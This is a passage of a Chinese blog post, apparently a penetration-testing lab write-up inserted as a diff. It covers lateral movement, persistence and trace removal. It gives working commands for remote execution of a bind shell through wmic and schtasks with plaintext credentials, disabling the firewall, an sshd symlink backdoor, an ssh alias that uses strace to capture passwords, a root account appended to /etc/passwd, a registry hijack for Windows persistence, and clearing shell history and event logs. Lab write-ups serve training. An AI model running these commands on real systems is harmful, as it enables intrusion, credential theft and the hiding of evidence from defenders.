+   <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.183</span><span class="hljs-number">.130</span> /<span class="hljs-keyword">user</span>:douser /<span class="hljs-keyword">password</span>:Dotest123 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd /c c:\\w_bind_10669.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221162432930.png" srcset="/img/loading.gif" lazyload alt="image-20240221162432930"></p>
+<p>   这个方式失败了</p>
+<p>   尝试定时任务</p>
+   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/S</span> WIN-ENS2VR5TR3N <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-string">/TR</span> c:<span class="hljs-string">/w_bind_10669.exe</span> <span class="hljs-string">/SC</span> MINUTE <span class="hljs-string">/ST</span> 14<span class="hljs-function">:29</span> <span class="hljs-string">/ru</span> system <span class="hljs-string">/f</span><br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/tn</span> test <span class="hljs-string">/s</span> WIN-ENS2VR5TR3N<br></code></pre></td></tr></table></figure>
+
+<p>   先尝试关闭防火墙，不然一直反弹不行</p>
+   <figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf">echo NetSh Advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off &gt;&gt; <span class="hljs-number">1</span>.bat<br>copy <span class="hljs-number">1</span>.bat \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165050569.png" srcset="/img/loading.gif" lazyload alt="image-20240221165050569"></p>
+<p>   开启一个定时任务关闭防火墙</p>
+   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/S</span> WIN-ENS2VR5TR3N <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;test1&quot;</span> <span class="hljs-string">/TR</span> c:<span class="hljs-string">/1.bat</span> <span class="hljs-string">/SC</span> ONCE <span class="hljs-string">/ST</span> 21<span class="hljs-function">:57</span> <span class="hljs-string">/ru</span> system <span class="hljs-string">/f</span><br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/tn</span> task1 <span class="hljs-string">/s</span> WIN-ENS2VR5TR3N<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165301837.png" srcset="/img/loading.gif" lazyload alt="image-20240221165301837"></p>
+<p>   成功反弹</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165559108.png" srcset="/img/loading.gif" lazyload alt="image-20240221165559108"></p>
+<p>   直接就是system</p>
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><ol>
+<li><p>针对 ubuntu </p>
+<ul>
+<li><p>使用ssh 软连接方式</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/sshd /</span>tmp<span class="hljs-regexp">/su;/</span>tmp/su -oport=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>生成公钥</p>
+</li>
+<li><p>起别名</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">alias ssh=&#x27;strace -o /tmp/sshpwd-`date +<span class="hljs-built_in">%d</span><span class="hljs-built_in">%h</span><span class="hljs-built_in">%m</span><span class="hljs-built_in">%s</span>`.log -e <span class="hljs-keyword">read</span>,<span class="hljs-keyword">write</span>,connect -s2048 ssh&#x27;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>创建后门账号</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">perl -e &#x27;print crypt(<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-string">&quot;adgfagm&quot;</span>).<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>&#x27;<br>echo <span class="hljs-string">&quot;weblogic1:adCP9<span class="hljs-subst">\\</span>qaScc2:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221171054574.png" srcset="/img/loading.gif" lazyload alt="image-20240221171054574"></p>
+</li>
+</ul>
+</li>
+<li><p>win7</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d 512 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG_DWORD /d 1 /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\system32\calc.exe&quot;</span> /f</span><br><br><span class="hljs-comment"># 可以更改C:\Windows\system32\calc.exe为payload，如powershell命令</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>域控，处内内网，但是已经写了定时任务</p>
+</li>
+</ol>
+<h1 id="痕迹清楚"><a href="#痕迹清楚" class="headerlink" title="痕迹清楚"></a>痕迹清楚</h1><ol>
+<li><p>ubuntu </p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">history</span> –w &amp;&amp; <span class="hljs-keyword">history</span> –c &amp;&amp; &gt; <span class="hljs-string">.bash_history</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>win7</p>
+<p>直接使用msf</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> event_manager -c<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221172419610.png" srcset="/img/loading.gif" lazyload alt="image-20240221172419610"></p>
 </li>
 </ol>
 
